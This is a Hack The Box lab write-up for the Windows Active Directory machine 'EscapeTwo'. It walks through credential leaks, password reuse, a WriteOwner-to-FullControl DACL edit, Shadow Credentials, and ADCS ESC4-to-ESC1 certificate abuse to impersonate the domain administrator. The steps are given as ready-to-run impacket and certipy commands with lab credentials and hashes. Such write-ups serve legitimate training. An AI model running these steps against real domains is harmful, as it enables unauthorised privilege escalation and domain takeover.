# HTB EscapeTwo

> **Platform:** Hack The Box
> **OS:** Windows (Active Directory)
> **Domain:** `sequel.htb` — DC: `DC01` (`10.129.232.128`)
> **Difficulty:** Easy
> **Assumed-breach start:** credentials `rose : KxEPkKe6R8su` are provided.

## Attack Path Overview

1. **Recon** – full `nmap` reveals a Domain Controller also running **MSSQL 2019**.
2. **SMB (as `rose`)** – readable `Accounting Department` share leaks an Excel file containing plaintext credentials, including the MSSQL `sa` account.
3. **MSSQL (as `sa`)** – xp_cmdshell / file read exposes `sql-Configuration.INI`, which contains the `sql_svc` service password. That password is reused by the user **`ryan`**.
4. **BloodHound** – `ryan` has **WriteOwner** over the **`ca_svc`** account.
5. **Abuse WriteOwner** – take ownership → grant FullControl (DACL) → **Shadow Credentials** to recover the NT hash of `ca_svc`.
6. **ADCS ESC4** – `ca_svc` (via `Cert Publishers`) can edit the `DunderMifflinAuthentication` template. Reconfigure it to be ESC1-vulnerable, request a certificate as `administrator`, and authenticate to recover the Domain Admin hash.

## 5. Abusing WriteOwner over `ca_svc`

> **Tip:** always use the real `sAMAccountName`, not display names, in these commands. Cross-check in BloodHound exactly which principal you are authenticating *as* versus which you are *attacking*.

The goal is to recover `ca_svc`'s NT hash via a **Shadow Credentials** attack. But Shadow Credentials needs write access to the target's `msDS-KeyCredentialLink`, and `WriteOwner` alone is not enough — so the chain is:

1. **Take ownership** of `ca_svc` (`WriteOwner` → owner).
2. As owner, **grant yourself FullControl** on `ca_svc` (DACL edit).
3. **Shadow Credentials** to obtain the NT hash.

### Step 5.1 — Take ownership

> ⚠️ **Mistake / gotcha:** the flag is `-new-owner`, **not** `-owner`. The first attempt used `-owner` and failed:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-owneredit -action write -owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

### Step 5.2 — Grant FullControl (DACL)

Without this step, Shadow Credentials fails with `INSUFF_ACCESS_RIGHTS`:

```
└─$ certipy-ad shadow auto -u 'ryan'@'sequel.htb' -p 'WqSZAF6CysDQbGb3' -account 'CA_SVC'
...
[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

So edit the DACL to give `ryan` FullControl over `ca_svc`:

```bash
impacket-dacledit -action write \
  -rights FullControl \
  -principal 'ryan' \
  -target 'ca_svc' \
  'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

**ESC4**: `ca_svc` is a member of **`Cert Publishers`**, which has Write Owner / Write DACL / Write Property over the `DunderMifflinAuthentication` template. That means we can **rewrite the template** into an ESC1-vulnerable state (enrollee supplies subject / arbitrary SAN), then abuse it as ESC1.

### Step 6.2 — Reconfigure the template to a vulnerable (ESC1) state

```bash
certipy-ad template \
    -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \
    -dc-ip '10.129.232.128' -template 'DunderMifflinAuthentication' \
    -write-default-configuration
```

> Confirm when prompted: `Are you sure you want to apply these changes ... (y/N): y`. This overwrites the template with Certipy's default permissive configuration (allows enrollee-supplied SAN + Client Authentication), making it ESC1-abusable.

### Step 6.3 — Request a certificate as `administrator`

```bash
certipy-ad req \
    -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \
    -dc-ip '10.129.232.128' -target 'DC01.sequel.htb' \
    -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' \
    -upn 'administrator@sequel.htb'
```

Equivalent short form:

```bash
certipy-ad req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
```

This yields `administrator.pfx`.

## Lessons Learned

- **`.xlsx` = ZIP.** When a spreadsheet looks corrupted or you lack a viewer, unzip it and read `xl/sharedStrings.xml` directly.
- **SQL unattended-install files** (`sql-Configuration.INI`) frequently leave service-account passwords on disk. Always read them once you have MSSQL file access.
- **Password reuse** between a service account and a domain user is the pivot that moves this box forward — always spray recovered passwords across known users.
- **`WriteOwner` is not immediately enough** for Shadow Credentials. The full chain is `WriteOwner → owneredit → dacledit (FullControl) → shadow auto`. The `INSUFF_ACCESS_RIGHTS` error is the signal that you skipped the DACL step.
- **Watch the flag names** — `impacket-owneredit` uses `-new-owner`, not `-owner`.
- **Clock skew** on AD boxes breaks Kerberos (`KRB_AP_ERR_SKEW`); sync time to the DC before certipy/Kerberos operations.
- **ESC4 → ESC1**: when you can edit a template's configuration, rewrite it into a vulnerable state and then run the standard ESC1 enrollment with an arbitrary UPN/SAN to impersonate a Domain Admin.
